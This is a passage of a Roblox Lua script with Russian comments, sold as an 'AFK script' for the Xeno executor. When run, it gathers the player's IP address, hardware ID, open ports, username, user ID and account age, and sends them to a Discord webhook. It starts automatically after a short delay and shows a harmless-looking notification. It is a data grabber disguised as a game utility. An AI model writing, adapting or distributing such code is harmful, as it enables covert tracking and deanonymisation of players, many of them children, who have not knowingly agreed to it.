    print("📤 Тестируем соединение с Discord...")
    local testResult = testDiscord()
    
    local gui = createGUI()
    if not gui then
        warn("❌ Ошибка создания GUI!")
        return
    end
    
    -- Получаем информацию
    local ip = getPlayerIP()
    local hwid = getHWID()
    local ports = getOpenPorts()
    
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    -- Формируем сообщение
    local message = string.format(
        "**🔔 AFK SCRIPT ЗАПУЩЕН**\n" ..
        "**👤 Игрок:** %s (@%s)\n" ..
        "**🆔 UserID:** %s\n" ..
        "**📅 Возраст:** %d дней\n" ..
        "**🌐 IP:** ||%s||\n" ..
        "**🖥️ HWID:** ||%s||\n" ..
        "**🔌 Порты:** ||%s||\n" ..
        "**🎮 Игра:** %s\n" ..
        "**⚡ Исполнитель:** XENO\n" ..
        "**⏰ Время:** %s",
        player.DisplayName,
        player.Name,
        player.UserId,
        player.AccountAge,
        ip,
        hwid,
        table.concat(ports, ", "),
        gameName,
        os.date("%H:%M:%S")
    )
    
    print("📤 Отправляем основное сообщение...")
    local mainResult = sendToDiscord(message)
    
    if mainResult then
        print("✅ Основное сообщение отправлено!")
    else
        print("❌ Ошибка отправки основного сообщения!")
        print("💡 Проверьте: 1) Интернет 2) Webhook URL 3) Разрешения Xeno")
    end
    
    -- Уведомление в Roblox
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "✅ AFK SCRIPT",
            Text = "Xeno | Нажми J для открытия | Discord: " .. (mainResult and "✅" or "❌"),
            Duration = 5
        })
    end)
    
    print("✅ AFK Script для Xeno загружен!")
    print("📊 Статус Discord: " .. (mainResult and "✅ Успешно" or "❌ Ошибка"))
end

-- Запускаем с задержкой
spawn(function()
    wait(1)
    pcall(startScript)
end)
